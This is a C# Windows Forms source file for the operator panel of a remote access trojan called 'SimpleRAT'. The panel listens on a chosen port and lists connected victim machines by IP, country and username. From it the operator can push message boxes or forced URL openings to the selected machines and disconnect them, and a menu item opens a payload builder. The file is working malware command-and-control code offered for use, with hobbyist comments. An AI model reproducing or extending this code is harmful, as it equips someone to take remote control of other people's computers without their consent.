using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Threading;
using Microsoft.VisualBasic;

namespace SimpleRAT
{
    public partial class frmMain : Form
    {
        Listener server;
        Thread startListen;
        public frmMain()
        {
            InitializeComponent();
            server = new Listener();
        }

        void updateOnline(int count)
        {
            /* My method of updating the online count */
            tslblOnline.Text = "Online: " + count.ToString();
        }

        private void startToolStripMenuItem_Click(object sender, EventArgs e)
        {
            startListen = new Thread(listen); /* Starts a new listening thread. */
            startListen.Start();
        }

        void listen()
        {
            /* Our thread-method for listening. */
            server.BeginListen(int.Parse(Interaction.InputBox("Enter port:", "Select a port", "1997"))); /* Sets a port and begins listening*/
            server.Received += new Listener.ReceivedEventHandler(server_Received);
            server.Disconnected += new Listener.DisconnectedEventHandler(server_Disconnected);
        }

        void server_Disconnected(Listener l, Info i)
        {
            /* Disconnection event */
            Invoke(new _Remove(Remove), i);
        }

        void server_Received(Listener l, Info i, string received)
        {
            /* Received event */
            string[] cmd = received.Split('|'); /* This splits our received data. */
            switch (cmd[0]) /* A simple switch-statement to check each command. If-statements could be used, but it'd be longer.*/
            {
                case "CONNECTION":
                    Invoke(new _Add(Add), i, cmd[1], cmd[2]);
                    break;
                case "STATUS":
                    Invoke(new _Status(Status), i, cmd[1]);
                    break;
            }
        }

        private void frmMain_FormClosing(object sender, FormClosingEventArgs e)
        {
            System.Diagnostics.Process.GetCurrentProcess().Kill();
        }

        /* From here on, we will be invoking. Now the reason why we do this is because I don't want to be using CheckForIllegalCrossThreads = false. That's a bad habit! */
        /* I also wanted to thank xSilent for teaching me how to do this. */
        delegate void _Add(Info i, string country, string username);
        void Add(Info i, string country, string username)
        {
            /* This is our method for adding clients */
            string[] splitIP = i.RemoteAddress.Split(':');
            ListViewItem item = new ListViewItem();
            item.Text = splitIP[0]; /* First column: IP Address */
            item.SubItems.Add(country); /* Second column: Country */
            item.SubItems.Add(username); /* Third column: Username */
            item.SubItems.Add("Connected!"); /* Fourth column(just so we don't have a null value): Status */
            item.Tag = i;
            lvConnections.Items.Add(item);

            updateOnline(lvConnections.Items.Count);
        }

        delegate void _Remove(Info i);
        void Remove(Info i)
        {
            /* Self explanatory. Just removes the client in the listview */
            foreach (ListViewItem item in lvConnections.Items)
            {
                if ((Info)item.Tag == i)
                {
                    item.Remove();
                    updateOnline(lvConnections.Items.Count);
                    break;
                }
            }
        }

        delegate void _Status(Info i, string status);
        void Status(Info i, string status)
        {
            /* Another self explanatory method. Changes the status*/
            foreach (ListViewItem item in lvConnections.Items)
            {
                if ((Info)item.Tag == i)
                {
                    item.SubItems[3].Text = status;
                    break;
                }
            }
        }

        private void builderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            frmBuild build = new frmBuild();
            build.Show();
        }

        private void sendMessageToolStripMenuItem_Click(object sender, EventArgs e)
        {
            /* Command: Send Messagebox */
            string msg = Interaction.InputBox("Enter message:", "Send Messagebox", "MERCURY IS THE BEST!");
            foreach (ListViewItem item in lvConnections.SelectedItems)
            {
                Info client = (Info)item.Tag;
                client.Send("MSGBOX|" + msg);
            }
        }

        private void openURLToolStripMenuItem_Click(object sender, EventArgs e)
        {
            /* Command: Open URL */
            string url = Interaction.InputBox("Enter URL:", "Open URL", "http://www.google.com");
            foreach (ListViewItem item in lvConnections.SelectedItems)
            {
                Info client = (Info)item.Tag;
                client.Send("OPENURL|" + url);
            }
        }

        private void disconnectToolStripMenuItem_Click(object sender, EventArgs e)
        {
            /* Command: Disconnect */
            foreach (ListViewItem item in lvConnections.SelectedItems)
            {
                Info client = (Info)item.Tag;
                client.Send("DISCONNECT|");
            }
        }
    }
}
